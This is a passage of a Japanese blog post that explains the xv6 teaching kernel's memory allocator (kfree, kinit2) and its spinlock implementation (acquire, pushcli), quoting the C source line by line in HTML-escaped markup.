&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; kmem&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;次の行では、引数として受け取ったアドレスが&lt;code class=&quot;language-text&quot;&gt;PGSIZE&lt;/code&gt;でアラインメントされており、かつページサイズの割り当てに十分な領域が存在しているかを確認しています。&lt;/p&gt;
&lt;p&gt;ここでチェックに失敗した場合は&lt;code class=&quot;language-text&quot;&gt;panic&lt;/code&gt;関数が呼び出されます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uint&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;v &lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt; PGSIZE &lt;span class=&quot;token operator&quot;&gt;||&lt;/span&gt; v &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; end &lt;span class=&quot;token operator&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;V2P&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;v&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&gt;=&lt;/span&gt; PHYSTOP&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;panic&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;kfree&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;panic&lt;/code&gt;関数については後述します。&lt;/p&gt;
&lt;p&gt;次の行ではページの先頭アドレス&lt;code class=&quot;language-text&quot;&gt;v&lt;/code&gt;から&lt;code class=&quot;language-text&quot;&gt;PGSIZE&lt;/code&gt;分のアドレス領域を1で埋めています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Fill with junk to catch dangling refs.&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;memset&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;v&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; PGSIZE&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;memset&lt;/code&gt;についても後述します。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;memset&lt;/code&gt;によるメモリ領域の初期化が完了したら以下の行が実行されます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;kmem&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;use_lock&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;acquire&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;kmem&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;lock&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
r &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;v&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
r&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;next &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; kmem&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;freelist&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
kmem&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;freelist &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; r&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;kmem&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;use_lock&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;release&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;kmem&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;lock&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;kinit1&lt;/code&gt;の実行時は、ロックは無効化されているため&lt;code class=&quot;language-text&quot;&gt;acquire&lt;/code&gt;と&lt;code class=&quot;language-text&quot;&gt;release&lt;/code&gt;は呼び出されません。&lt;/p&gt;
&lt;p&gt;そのため、&lt;code class=&quot;language-text&quot;&gt;kmem.freelist&lt;/code&gt;の先頭に新しい&lt;code class=&quot;language-text&quot;&gt;run&lt;/code&gt;構造体が1ページ分追加され、&lt;code class=&quot;language-text&quot;&gt;kfree&lt;/code&gt;の処理は終了します。&lt;/p&gt;
&lt;p&gt;これで&lt;code class=&quot;language-text&quot;&gt;freerange&lt;/code&gt;関数の処理も終了するため、&lt;code class=&quot;language-text&quot;&gt;kinit1&lt;/code&gt;の処理も終了し、&lt;code class=&quot;language-text&quot;&gt;main.c&lt;/code&gt;の次の関数の実行に進みます。&lt;/p&gt;
&lt;h2 id=&quot;kinit2関数&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#kinit2%E9%96%A2%E6%95%B0&quot; aria-label=&quot;kinit2関数 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;kinit2関数&lt;/h2&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;kinit1&lt;/code&gt;からしばらくカーネルの処理を実行した後、&lt;code class=&quot;language-text&quot;&gt;kinit2&lt;/code&gt;関数が呼び出されます。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;kinit2&lt;/code&gt;関数はロックを有効化し、さらに大きなサイズのメモリ領域を確保します。&lt;/p&gt;
&lt;p&gt;動作は&lt;code class=&quot;language-text&quot;&gt;kinit1&lt;/code&gt;とほぼ同じです。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token function&quot;&gt;kinit2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;P2V&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;P2V&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;PHYSTOP&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;// must come after startothers()&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;vstart&lt;/code&gt;には4MiBのアドレスが割り当てされ、&lt;code class=&quot;language-text&quot;&gt;vend&lt;/code&gt;にはアドレス領域の終端として設定されている&lt;code class=&quot;language-text&quot;&gt;0xE000000&lt;/code&gt;が与えられます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;kinit2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;vstart&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;vend&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;freerange&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;vstart&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; vend&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  kmem&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;use_lock &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;kmem.use_lock = 1;&lt;/code&gt;の行以外は&lt;code class=&quot;language-text&quot;&gt;kinit1&lt;/code&gt;と同じです。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;freerange&lt;/code&gt;で&lt;code class=&quot;language-text&quot;&gt;vstart&lt;/code&gt;から&lt;code class=&quot;language-text&quot;&gt;vend&lt;/code&gt;までの領域を解放してページリストに追加した後、ロックを有効化して終了します。&lt;/p&gt;
&lt;p&gt;これ以降はロックが有効化されているため、メモリの確保と解放のために&lt;code class=&quot;language-text&quot;&gt;acquire&lt;/code&gt;関数と&lt;code class=&quot;language-text&quot;&gt;release&lt;/code&gt;関数が呼び出されるようになります。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;acquire&lt;/code&gt;関数と&lt;code class=&quot;language-text&quot;&gt;release&lt;/code&gt;関数はどちらも&lt;code class=&quot;language-text&quot;&gt;spinlock.c&lt;/code&gt;で定義されています。&lt;/p&gt;
&lt;h2 id=&quot;xv6のロックについて&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#xv6%E3%81%AE%E3%83%AD%E3%83%83%E3%82%AF%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6&quot; aria-label=&quot;xv6のロックについて permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;xv6のロックについて&lt;/h2&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;acquire&lt;/code&gt;関数と&lt;code class=&quot;language-text&quot;&gt;release&lt;/code&gt;関数を読む前にxv6におけるロックの仕様を確認します。&lt;/p&gt;
&lt;p&gt;xv6OSはマルチプロセッサ環境で動作します。&lt;/p&gt;
&lt;p&gt;マルチプロセッサ環境の場合、複数のCPUが物理メモリリソースを共有しています。&lt;/p&gt;
&lt;p&gt;そのため、それぞれのCPUの処理が共有リソースを勝手に書き換えて問題を引き起こしたり競合したりしないようにするための仕組みがロックです。&lt;/p&gt;
&lt;p&gt;ロックによって任意のメモリ領域の排他制御を行うことで、そのメモリ領域に対して1つのCPUのみが操作可能な状態にすることができます。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://pdos.csail.mit.edu/6.828/2018/xv6/book-rev11.pdf&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;xv6&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;xv6OSでは、スピンロックとスリーブロックの2種類のロックが実装されています。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;acquire&lt;/code&gt;関数と&lt;code class=&quot;language-text&quot;&gt;release&lt;/code&gt;関数で行っているロックはスピンロックです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://ja.wikipedia.org/wiki/%E3%82%B9%E3%83%94%E3%83%B3%E3%83%AD%E3%83%83%E3%82%AF&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;スピンロック - Wikipedia&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;スピンロックによって、プロセスがメモリリソースを確保する際に、対象がすでにロックされている場合は、ロックが解除されるまでループを行って待機します。&lt;/p&gt;
&lt;h3 id=&quot;acquire関数&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#acquire%E9%96%A2%E6%95%B0&quot; aria-label=&quot;acquire関数 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;acquire関数&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;aquire&lt;/code&gt;関数は&lt;code class=&quot;language-text&quot;&gt;spinlock&lt;/code&gt;構造体のポインタを引数としてロックを行います。&lt;/p&gt;
&lt;p&gt;ここでやりたいことはシンプルで、&lt;code class=&quot;language-text&quot;&gt;spinlock&lt;/code&gt;構造体の&lt;code class=&quot;language-text&quot;&gt;locked&lt;/code&gt;に1をセットすることを試み、ロックが確保できるまでループして処理を待機させることです。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Acquire the lock.&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// Loops (spins) until the lock is acquired.&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// Holding a lock for a long time may cause&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// other CPUs to waste time spinning to acquire it.&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;acquire&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;spinlock&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;lk&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;pushcli&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;// disable interrupts to avoid deadlock.&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;holding&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;lk&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;panic&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;acquire&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;token comment&quot;&gt;// The xchg is atomic.&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;xchg&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;lk&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;locked&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;token comment&quot;&gt;// Tell the C compiler and the processor to not move loads or stores&lt;/span&gt;
  &lt;span class=&quot;token comment&quot;&gt;// past this point, to ensure that the critical section&apos;s memory&lt;/span&gt;
  &lt;span class=&quot;token comment&quot;&gt;// references happen after the lock is acquired.&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;__sync_synchronize&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;token comment&quot;&gt;// Record info about lock acquisition for debugging.&lt;/span&gt;
  lk&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;cpu &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;mycpu&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;getcallerpcs&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;lk&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; lk&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;pcs&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;spinlock&lt;/code&gt;構造体の定義も再掲しておきます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Mutual exclusion lock.&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;spinlock&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  uint locked&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;       &lt;span class=&quot;token comment&quot;&gt;// Is the lock held?&lt;/span&gt;

  &lt;span class=&quot;token comment&quot;&gt;// For debugging:&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;name&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;        &lt;span class=&quot;token comment&quot;&gt;// Name of lock.&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;cpu&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;cpu&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;token comment&quot;&gt;// The cpu holding the lock.&lt;/span&gt;
  uint pcs&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;      &lt;span class=&quot;token comment&quot;&gt;// The call stack (an array of program counters)&lt;/span&gt;
                     &lt;span class=&quot;token comment&quot;&gt;// that locked the lock.&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;acquire&lt;/code&gt;関数の処理を順に見ていきます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token function&quot;&gt;pushcli&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;// disable interrupts to avoid deadlock.&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;holding&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;lk&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;panic&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;acquire&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;pushcli&lt;/code&gt;関数は&lt;code class=&quot;language-text&quot;&gt;spinlock.c&lt;/code&gt;で定義された関数です。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;cli&lt;/code&gt;と同様に割込みを抑制させていますが、ここではスタックを利用してネストされた割込み禁止命令を実現しています。&lt;/p&gt;
&lt;p&gt;この処理によって、この後&lt;code class=&quot;language-text&quot;&gt;xchg&lt;/code&gt;でロックを確保する際に割込みが有効な状態でロックが保持される状況によってデッドロックが発生することを防いでいます。&lt;/p&gt;
&lt;p&gt;割込みを再開するには&lt;code class=&quot;language-text&quot;&gt;popcli&lt;/code&gt;関数を呼び出します。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;acquire&lt;/code&gt;関数では&lt;code class=&quot;language-text&quot;&gt;popcli&lt;/code&gt;関数は呼び出されません。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;acquire&lt;/code&gt;関数で実行された&lt;code class=&quot;language-text&quot;&gt;pushcli&lt;/code&gt;関数に対応した&lt;code class=&quot;language-text&quot;&gt;popcli&lt;/code&gt;関数は&lt;code class=&quot;language-text&quot;&gt;release&lt;/code&gt;関数が実行します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Pushcli/popcli are like cli/sti except that they are matched:&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// it takes two popcli to undo two pushcli.  Also, if interrupts&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// are off, then pushcli, popcli leaves them off.&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;pushcli&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; eflags&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  eflags &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;readeflags&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
